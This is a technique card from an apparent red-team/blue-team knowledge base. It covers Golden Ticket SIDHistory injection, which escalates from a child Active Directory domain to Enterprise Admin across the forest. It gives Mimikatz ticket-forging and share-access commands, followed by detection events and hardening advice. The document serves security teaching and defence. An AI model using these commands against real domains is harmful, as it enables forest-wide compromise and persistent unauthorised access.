# [CA-KERB-012]: Golden Ticket SIDHistory Manipulation

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-KERB-012 |
| **MITRE ATT&CK v18.1** | [Access Token Manipulation: SID-History Injection (T1134.005)](https://attack.mitre.org/techniques/T1134/005/) |
| **Tactic** | Persistence / Privilege Escalation |
| **Platforms** | Windows AD |
| **Severity** | **Critical** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** When creating a Golden Ticket (CA-KERB-003), attackers can inject arbitrary SIDs into the `SIDHistory` field of the PAC. This is typically used to jump between domains in a forest. By adding the SID of the "Enterprise Admins" group (RootDomain\519) into the SIDHistory of a ticket for a Child Domain user, the user gains Enterprise Admin rights across the entire forest.
- **Attack Surface:** Kerberos PAC validation and Cross-Domain Trust boundaries.
- **Business Impact:** **Forest Compromise**. Escaping a child domain to compromise the root.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** KRBTGT Hash of the *Child* Domain.
- **Vulnerable Config:** SID Filtering disabled (rare) or default Trust configuration which allows SID History for migration purposes.
- **Tools:**
    - [Mimikatz](https://github.com/gentilkiwi/mimikatz)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Get SIDs**
Get the SID of the current domain and the target (Root) domain.
```powershell
Get-DomainSID
```

**Step 2: Forge Ticket**
Create a Golden Ticket using the *Child* KRBTGT hash, but inject the *Root* Enterprise Admin SID into SIDHistory.
```powershell
# /sids: The SID of Enterprise Admins (RootDomainSID-519)
kerberos::golden /user:FakeAdmin /domain:child.root.local /sid:ChildSID /krbtgt:ChildHash /sids:RootSID-519 /ptt
```

**Step 3: Access Root**
Access the file share of the Root Domain Controller.
```cmd
dir \\RootDC.root.local\C$
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Event Logs
| Source | Event ID | Filter Logic |
|---|---|---|
| **Security** | 4769 | Service Ticket Request where `SID History` field is present. |
| **Security** | 4626 | User/Device Claims information (audit detailed token info). |

#### 5.2 Sentinel (KQL)
```kusto
SecurityEvent
| where EventID == 4769
| where Status == "0x0"
// Advanced: Parse the SidHistory field if available in extended auditing
```

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **SID Filtering:** Ensure "SID Filtering" (Quarantine) is enabled on all inter-forest trusts.
*   **Forest Boundary:** Treat the Forest as the security boundary, not the Domain. Compromise of a child domain effectively compromises the forest due to SID History design.

## 7. ATTACK CHAIN
> **Preceding Technique:** [CA-KERB-003] (Golden Ticket)
> **Next Logical Step:** [LAT-AD-003] (Full Forest Persistence)
